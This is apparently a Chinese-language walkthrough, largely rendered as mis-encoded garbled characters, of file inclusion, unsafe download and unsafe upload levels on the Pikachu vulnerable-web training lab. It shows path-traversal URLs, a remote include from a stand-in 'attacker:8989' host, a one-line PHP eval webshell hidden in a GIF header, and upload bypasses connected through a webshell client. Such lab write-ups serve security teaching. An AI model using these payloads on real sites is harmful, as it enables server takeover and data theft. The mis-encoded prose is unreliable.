</font>**<font style="color:rgb(57, 57, 57);">1.æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</font>**<font style="color:rgb(57, 57, 57);">ä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº› å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚  
</font>**<font style="color:rgb(57, 57, 57);">2.è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</font>**<font style="color:rgb(57, 57, 57);">èƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">å› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œå¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œFile Inclusionâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>



## 6.1 æ–‡ä»¶åŒ…å«ï¼ˆæœ¬åœ°ï¼‰
å…ˆçœ‹çœ‹è¿™ä¸ªç½‘é¡µçš„åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼š

å‰ç«¯é€‰æ‹©å¯¹åº”çš„æ–‡ä»¶ï¼Œè¯¥ç½‘é¡µé€šè¿‡ GET ä¼ å‚çš„æ–¹å¼ä»åå°è¯·æ±‚ä¸åŒçš„æ–‡ä»¶ï¼Œè¿™å°±æ˜¯è¿™ä¸ªç½‘é¡µçš„åŸºæœ¬åŠŸèƒ½ã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620756.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617319.png)



é‚£ä¹ˆæ—¢ç„¶å®ƒå¯ä»¥å‘åå°è¯·æ±‚æ–‡ä»¶ï¼Œæˆ‘ä»¬æƒ³èƒ½ä¸èƒ½è¯·æ±‚é™¤äº† file1-5 å¤–å…¶ä»–çš„æ–‡ä»¶ï¼Œçœ‹åˆ°å½“å‰é¡µé¢ä¸åº”è¯¥çœ‹åˆ°çš„ä¸œè¥¿



è¿™æ—¶å€™ç”¨çš„å°±æ˜¯ä¹‹å‰åœ¨ Linux ä¸­å­¦ä¹ çš„å…³äºæ–‡ä»¶çš„æ“ä½œå‘½ä»¤ã€‚



æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å°è¯•**é€šè¿‡ **`**../**`**çš„æ–¹å¼è¿›è¡Œç›®å½•è·³è½¬ï¼Œè¯»å–å…¶ä»–ç›®å½•ä¸‹çš„æ–‡ä»¶**ï¼š`../../../../index.html`

è¿™æ ·è®¿é—®çš„å°±æ˜¯æœ¬åœ°çš„æ–‡ä»¶ï¼Œ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622127.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617696.png)



## <font style="color:rgb(0, 0, 0);">6.2 æ–‡ä»¶åŒ…å«ï¼ˆè¿œç¨‹ï¼‰</font>
è¿œç¨‹çš„æ–‡ä»¶åŒ…å«éœ€è¦ php.ini è¿›è¡Œé…ç½®

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051618863.png)



é¦–å…ˆç¡®å®šå½“å‰çš„ php ç‰ˆæœ¬ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623168.png)



æ‰¾åˆ°å¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616401.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">åŒå‡»æ‰“å¼€ï¼Œè¿›è¡Œä¿®æ”¹ï¼š</font>

<font style="color:rgb(0, 0, 0);"></font>

```plain
allow_url_fopen = On
allow_url_include = On
```



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625174.png)

<font style="color:rgb(0, 0, 0);"></font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623567.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">ä¿®æ”¹å®Œæˆä¹‹å</font>**<font style="color:rgb(0, 0, 0);">ä¿å­˜ï¼Œå¹¶é‡å¯ PHPStudy</font>**

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">æ²¡æœ‰æŠ¥é”™ï¼Œä¿®æ”¹å®Œæˆ</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623637.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624532.png)

<font style="color:rgb(0, 0, 0);"></font>

`<font style="color:rgb(0, 0, 0);">filename=include%2Ffile1.php</font>`

`<font style="color:rgb(0, 0, 0);">%2F</font>`<font style="color:rgb(0, 0, 0);"> æ˜¯ URL ç¼–ç çš„</font>`<font style="color:rgb(0, 0, 0);">/</font>`

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">è¿™ç§æƒ…å†µè¯´æ˜ </font>`<font style="color:rgb(0, 0, 0);">include()</font>`<font style="color:rgb(0, 0, 0);"> ç”Ÿæ•ˆï¼Œ</font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">æ¯”å¦‚å¯ä»¥ç»™ä»–åŒ…å«ä¸€ä¸ªç½‘ç«™ï¼š</font>

<font style="color:rgb(0, 0, 0);">include() å°±æŠŠè¿™ä¸ªåœ°å€ç›´æ¥è®¿é—®äº†</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615597.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">é‚£å¦‚æœåŒ…å«çš„æ”»å‡»è€…çš„åé—¨ï¼Œå°±å¯ä»¥éšæ„è¯»å–è¯¥ç½‘ç«™ï¼ˆå­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«çš„ï¼‰çš„ä¿¡æ¯ï¼Œæ‰§è¡Œä»»æ„ä»£ç </font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">ä½œä¸ºæ¼”ç¤ºï¼Œå»ºç«‹ä¸€ä¸ªæ”»å‡»è€…ç«™ç‚¹ï¼š</font>

<font style="color:rgb(0, 0, 0);">http://attacker:8989/</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636715.png)	

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">è®¾ç½®åé—¨æ–‡ä»¶ï¼š</font>

<font style="color:rgb(0, 0, 0);">æ–‡ä»¶å†…å®¹æ˜¯è¯»å–ç½‘ç«™çš„ php ä¿¡æ¯ã€‚</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615883.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">å½“æˆ‘ä»¬æ‰§è¡Œ</font>`<font style="color:rgb(0, 0, 0);">?filename=</font>[http://attacker:8989/file.tx](http://attacker:8989/file.tx)t`<font style="color:rgb(0, 0, 0);">ï¼Œè¯¥æ¼æ´ç½‘ç«™å°±ä¼šæŠŠ file.txt ä¸­çš„ä»£ç </font>`<font style="color:rgb(0, 0, 0);">phpinfo()</font>`<font style="color:rgb(0, 0, 0);">æ‰§è¡Œ ã€‚</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622572.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

# <font style="color:rgb(0, 0, 0);">7ã€Unsafe Filedownloadï¼ˆä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ ï¼‰</font>
> **<font style="color:rgb(57, 57, 57);">ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¦‚è¿°</font>**
>
> <font style="color:rgb(57, 57, 57);">æ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥æ—¶ï¼Œä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œåå°åœ¨æ”¶åˆ°è¯·æ±‚åä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œæç¤ºæ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶å“åº”ç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶ååï¼Œå°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­ä¸€ä¸ªéœ€è¦è€Œä¸æ˜¯è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚</font><font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">å¦‚æœæ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªå‰é¢æåˆ°çš„æ„é€ çš„è·¯å¾„ï¼ˆæ¯”å¦‚../../../etc/passwdï¼‰ï¼Œåˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯ï¼ˆå¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰ï¼‰è¢«ä¸‹è½½ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶æ˜¯ç”±æ¥å£ä¼ å‡ºçš„ï¼Œåˆ™ä¸€å®šè¦å¯¹ä¼ å‡ºçš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ã€‚åˆ‡è®°ï¼šæ‰€æœ‰ä¸æ¥å£äº¤æ¢çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼</font>
>
> <font style="color:rgb(57, 57, 57);">æ‚¨å¯ä»¥é€šè¿‡â€œä¸å®‰å…¨æ–‡ä»¶ä¸‹è½½â€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>



<font style="color:rgb(0, 0, 0);">é€šè¿‡æ¦‚è¿°ï¼Œæˆ‘ä»¬å¯¹ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æœ‰ä¸€ä¸ªå¤§ä½“çš„äº†è§£ï¼Œæ¥ä¸‹æ¥é€šè¿‡æœ¬å…³è¿›ä¸€æ­¥ç†è§£è¯¥æ¼æ´ï¼š</font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">çƒå‘˜çš„åå­—ç‚¹å‡»ä¹‹åå¯ä»¥è¿›è¡Œä¸‹è½½</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628551.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">æŸ¥çœ‹è¿™ä¸ªåå­—ä¸ºä»€ä¹ˆç‚¹å‡»åä¼šè¿›è¡Œä¸‹è½½ï¼š</font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">å³é”®å¤åˆ¶é“¾æ¥åœ°å€ï¼š</font>`[http://pikachu:8765/vul/unsafedownload/execdownload.php?filename=kb.png](http://pikachu:8765/vul/unsafedownload/execdownload.php?filename=kb.png)`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621243.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">è¿™ä¸ªé“¾æ¥å®é™…ä¸Šå’Œæœ¬åœ°æ–‡ä»¶åŒ…å«ä¸­çš„æ˜¯ä¸€æ ·çš„ç±»å‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡Œç›®å½•è·³è½¬ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥ä¸‹è½½åˆ°å…¶ä»–çš„æ–‡ä»¶ï¼Ÿ</font>

`[http://pikachu:8765/vul/unsafedownload/execdownload.php?filename=<font style="color:rgb(0, 0, 0);">../../../../index.html</font>](http://pikachu:8765/vul/unsafedownload/execdownload.php?filename=kb.png)`



è¿™æ ·æ˜¯å¯ä»¥è¿›è¡Œä¸‹è½½çš„ï¼Œä¹Ÿå°±æ˜¯â€œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½â€

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051618151.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

# <font style="color:rgb(0, 0, 0);">8ã€Unsafe Fileupload (ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ )</font>
> **<font style="color:rgb(57, 57, 57);">ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´æ¦‚è¿°</font>**
>
> <font style="color:rgb(57, 57, 57);">æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½åœ¨webåº”ç”¨ç³»ç»Ÿä¸­å¾ˆå¸¸è§ï¼Œæ¯”å¦‚å¾ˆå¤šç½‘ç«™æ³¨å†Œçš„æ—¶å€™éœ€è¦ä¸Šä¼ å¤´åƒã€ä¸Šä¼ é™„ä»¶ç­‰ã€‚å½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®åï¼Œåå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­ä¾‹å¦‚æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹ã€åç¼€åã€å¤§å°ç­‰ç­‰ï¼Œç„¶åå°†å…¶æŒ‰ç…§è®¾è®¡çš„æ ¼å¼è¿›è¡Œé‡å‘½ååå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ä¸­ã€‚å¦‚æœåˆ™è¯´ä»»ä½•åå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œçš„å®‰å…¨åˆ¤æ–­æˆ–è€…åˆ¤æ–­æ¡ä»¶ä¸å¤Ÿä¸¥è°¨ï¼Œæ”»å‡»ç€å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›æœ‰å®³çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨è¢«webshellã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ã€‚æ¯”å¦‚ï¼š</font><font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">--éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€åã€å¤§å°ï¼›</font><font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">--éªŒè¯æ–‡ä»¶çš„ä¸Šä¼ æ–¹å¼;</font><font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">--å¯¹æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½åï¼›</font><font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">--ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„;</font><font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">â€”â€”â€¦â€¦ç­‰ç­‰</font><font style="color:rgb(57, 57, 57);">  
</font>
>
> <font style="color:rgb(57, 57, 57);">æ‚¨å¯ä»¥é€šè¿‡â€œä¸å®‰å…¨æ–‡ä»¶ä¸Šä¼ â€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

## <font style="color:rgb(0, 0, 0);">8.1 client check</font>


æç¤ºåªå…è®¸ä¸Šä¼ å›¾ç‰‡

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620614.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">é‚£å°±ä¸Šä¼ ä¸€ä¸ªç‰¹æ®Šå›¾ç‰‡ï¼Œè¯¥å›¾ç‰‡çš„æ„é€ å¦‚ä¸‹ï¼š</font>

<font style="color:rgb(0, 0, 0);">é¦–å…ˆå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæ”¹åç¼€ä¸º .jpg å°±å¥½äº†</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620597.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">ä¸Šä¼ å›¾ç‰‡å¹¶æŠ“åŒ…</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635390.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">æŠ“åŒ…ä¹‹åä¿®æ”¹æ–‡ä»¶åç¼€åä¸º .phpï¼Œå†æ¬¡å‘åŒ…ï¼Œå‘ç°å°†ä¸€å¥è¯æœ¨é©¬æˆåŠŸä¸Šä¼ </font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627742.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">ä½¿ç”¨èšå‰‘è¿æ¥ï¼š</font>

<font style="color:rgb(0, 0, 0);">ç©ºç™½å¤„å³é”®é€‰æ‹©ï¼šæ·»åŠ æ•°æ®</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051632891.png)



å°†ä¸Šä¼ çš„ php æ–‡ä»¶çš„åœ°å€å†™å…¥

è¿æ¥å¯†ç ä¸º a

æµ‹è¯•è¿æ¥æˆåŠŸ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636457.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

## <font style="color:rgb(0, 0, 0);">8.2 MIME type</font>


åŒæ ·å…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡çœ‹çœ‹æ•°æ®åŒ…



å‘ç°æŒ‰ç…§ 8.1 çš„æ–¹æ³•å†æ¬¡ä¸Šä¼ æˆåŠŸ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631582.png)



å½“ç„¶ï¼Œè¿™é“é¢˜çš„æ­£å¸¸æµç¨‹åº”è¯¥æ˜¯å…ˆä¸Šä¼ ä¸€ä¸ª php æ–‡ä»¶ï¼Œè¿›è¡Œä¿®æ”¹ MIME æ–‡ä»¶ç±»å‹ï¼Œä¹‹åé‡æ–°ä¸Šä¼ ï¼š

ç°åœ¨ä¸Šä¼ çš„å°±æ˜¯ä¸€ä¸ª php æ–‡ä»¶ï¼Œ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624255.png)

å¯¹å…¶æ–‡ä»¶ç±»å‹è¿›è¡Œä¿®æ”¹ï¼šæ¢æˆä¸€ä¸ªåˆæ³•çš„æ–‡ä»¶ç±»å‹

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051632203.png)

ä¸Šä¼ æˆåŠŸ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631950.png)



## <font style="color:rgb(0, 0, 0);">8.3 </font>getimagesize()
> # <font style="color:rgb(0, 0, 0);background-color:rgb(250, 252, 253);">php getimagesize å‡½æ•° - è·å–å›¾åƒä¿¡æ¯</font>
> **<font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">getimagesize() å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯</font>**<font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚</font>
>
> <font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">è¯­æ³•æ ¼å¼ï¼š</font>
>
> array getimagesize ( string $filename [, array &$imageinfo ] )
>
> <font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">getimagesize() å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚</font>
>

<font style="color:rgb(0, 0, 0);">å‡½æ•°çš„åŸç†å°±æ˜¯é€šè¿‡è¯»å–æ–‡ä»¶å¤´éƒ¨çš„å­—ç¬¦ä¸²ï¼Œæ¥åˆ¤æ–­æ˜¯å¦ä¸ºæ­£å¸¸å›¾ç‰‡ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ï¼ˆ 010 Editorï¼ˆæ¨èï¼‰ã€Notepad++ã€è®°äº‹æœ¬ï¼ˆWindows è‡ªå¸¦ï¼‰ï¼‰æ‰“å¼€ä¸€å¼ å›¾ç‰‡ï¼š</font>

<font style="color:rgb(0, 0, 0);">è¿™å¼  gif å›¾ç‰‡çš„æ–‡ä»¶å¤´å°±æ˜¯ GIF89a </font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051632603.png)

<font style="color:rgb(0, 0, 0);"></font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051632445.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">çŸ¥é“äº†è¿™äº›ï¼Œæˆ‘ä»¬å°±å¯ä»¥å»æ„é€ ä¸€ä¸ªå›¾ç‰‡é©¬äº†ï¼š</font>

<font style="color:rgb(0, 0, 0);">è¿˜æ˜¯å‡†å¤‡ä¸€ä¸ªç©ºç™½çš„å›¾ç‰‡æ–‡ä»¶ï¼š</font>

<font style="color:rgb(0, 0, 0);">å†™å…¥ï¼š</font>

```bash
GIF89a
<?=eval($_POST['a']);?>
```

<font style="color:rgb(0, 0, 0);">è¯´æ˜ï¼š</font>

